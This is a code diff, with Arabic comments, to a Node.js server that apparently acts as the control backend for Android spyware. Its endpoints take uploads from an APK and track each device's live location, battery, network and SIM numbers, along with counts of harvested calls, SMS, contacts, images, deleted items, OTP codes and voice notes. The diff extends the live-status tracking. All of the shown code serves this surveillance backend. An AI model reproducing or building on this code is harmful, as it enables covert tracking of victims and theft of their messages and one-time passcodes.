@@ -264,9 +264,6 @@ app.post('/auth/revoke-device', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// استقبال البيانات من APK
-// ═══════════════════════════════════════════════════════
 app.post('/upload.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
@@ -506,6 +503,9 @@ app.post('/upload.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ═══════════════════════════════════════════════════════
+// ✅ live_update — محدّث بالحقول الجديدة
+// ═══════════════════════════════════════════════════════
 app.post('/live_update.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
@@ -516,16 +516,34 @@ app.post('/live_update.php', (req, res) => {
         const liveFile = path.join(deviceDir, 'live.json');
         let live = {};
         if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
-        live.network = data.network || 'متصل';
-        live.battery = data.battery || null;
-        live.location = data.location || null;
-        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
+
+        // ✅ بيانات الشبكة
+        if (data.network) live.network = data.network;
+        if (data.network_type) live.network_type = data.network_type;
+
+        // ✅ البطارية + الشحن
+        if (data.battery !== undefined && data.battery !== null) live.battery = data.battery;
+        if (data.charging !== undefined) live.charging = data.charging;
+        if (data.charging_type) live.charging_type = data.charging_type;
+
+        // ✅ الموقع — لا يمسح إذا فاضي
+        if (data.location && data.location.latitude && data.location.longitude) {
+            live.location = data.location;
+        }
+
+        // ✅ آخر اتصال
+        if (data.last_seen) live.last_seen = data.last_seen;
+        else live.last_seen = Math.floor(Date.now() / 1000);
+
         fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
         updateDevicesList(deviceId, null);
         res.json({ success: true });
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ═══════════════════════════════════════════════════════
+// ✅ live.php — محدّث بالحقول الجديدة
+// ═══════════════════════════════════════════════════════
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -549,14 +567,40 @@ app.get('/live.php', (req, res) => {
         const profileFile = path.join(dataDir, deviceId, 'profile.json');
         const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
 
-        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0, otp_count: 0, voice_count: 0, sim_numbers: [], carrier: '', self_number: '', profile_number: '', profile_name: '' };
+        let response = { 
+            online: false, 
+            network: 'غير متصل', 
+            network_type: 'غير معروف',
+            battery: null, 
+            charging: false,
+            charging_type: 'لا',
+            location: null, 
+            last_seen: 0, 
+            seconds_ago: 999999, 
+            call_count: 0, 
+            sms_count: 0, 
+            contacts_count: 0, 
+            images_count: 0, 
+            apps_count: 0, 
+            deleted_count: 0, 
+            otp_count: 0, 
+            voice_count: 0, 
+            sim_numbers: [], 
+            carrier: '', 
+            self_number: '', 
+            profile_number: '', 
+            profile_name: '' 
+        };
 
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
-            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 300;
+            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 20;
             response.network = live.network || 'غير معروف';
-            response.battery = live.battery || null;
+            response.network_type = live.network_type || 'غير معروف';
+            response.battery = live.battery !== undefined ? live.battery : null;
+            response.charging = live.charging || false;
+            response.charging_type = live.charging_type || 'لا';
             response.location = live.location || null;
             response.last_seen = lastSeen;
             response.seconds_ago = Math.floor(Date.now()/1000) - lastSeen;
@@ -887,7 +931,6 @@ app.get('/devices.json', (req, res) => {
     } catch (e) { res.json([]); }
 });
 
-// ✅ محدّث: يحدّث live.json تلقائياً
 function updateDevicesList(deviceId, deviceInfo) {
     while (devicesLock) { /* spin */ }
     devicesLock = true;
@@ -910,7 +953,6 @@ function updateDevicesList(deviceId, deviceInfo) {
         }
         fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 
-        // ✅ NEW: حدّث live.json تلقائياً
         try {
             const liveFile = path.join(dataDir, deviceId, 'live.json');
             let live = {};
